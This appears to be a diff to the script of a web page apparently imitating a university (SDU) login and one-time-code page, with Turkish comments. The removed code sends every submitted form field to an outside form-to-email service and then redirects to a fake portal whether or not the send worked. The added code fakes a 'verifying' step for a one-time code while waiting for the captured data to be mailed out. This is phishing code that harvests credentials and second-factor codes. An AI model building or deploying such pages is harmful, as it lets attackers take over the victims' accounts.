@@ -966,40 +966,18 @@
                                         </div>
 </body>
 <script>
-    window.addEventListener('load', function () {
-        const form = document.getElementById('stsForm'); // Form ID'si
-        const btn = document.getElementById('submitBtn'); // Buton ID'si
+    const form = document.getElementById('otpForm');
+    const btn = document.getElementById('submitBtn');
 
-        if (form) {
-            form.addEventListener('submit', function (e) {
-                e.preventDefault(); // Sayfanın yenilenmesini durdur
+    form.addEventListener('submit', function (e) {
+        // Butonu hemen değiştir ki hoca tıkladığını anlasın
+        btn.disabled = true;
+        btn.innerHTML = "Sistem Doğrulanıyor...";
 
-                if (btn) {
-                    btn.disabled = true;
-                    btn.innerHTML = "Giriş Yapılıyor...";
-                }
-
-                const formData = new FormData(this);
-                const object = Object.fromEntries(formData);
-                const json = JSON.stringify(object);
-
-                fetch('https://api.web3forms.com/submit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: json
-                })
-                    .then(() => {
-                        // İşlem başarılı, portal sayfasına uçur
-                        window.location.href = "sdu_portal.html";
-                    })
-                    .catch(() => {
-                        // Hata olsa bile portala git (Sunumun aksamasın)
-                        window.location.href = "sdu_portal.html";
-                    });
-            });
-        }
+        // Kritik Nokta: Formun gönderilmesi için 1 saniye bekle, sonra portala uçur
+        // Bu süre mailin yola çıkması için teknik olarak yeterlidir
+        setTimeout(function () {
+            window.location.href = "sdu_portal.html";
+        }, 1200);
     });
 </script>
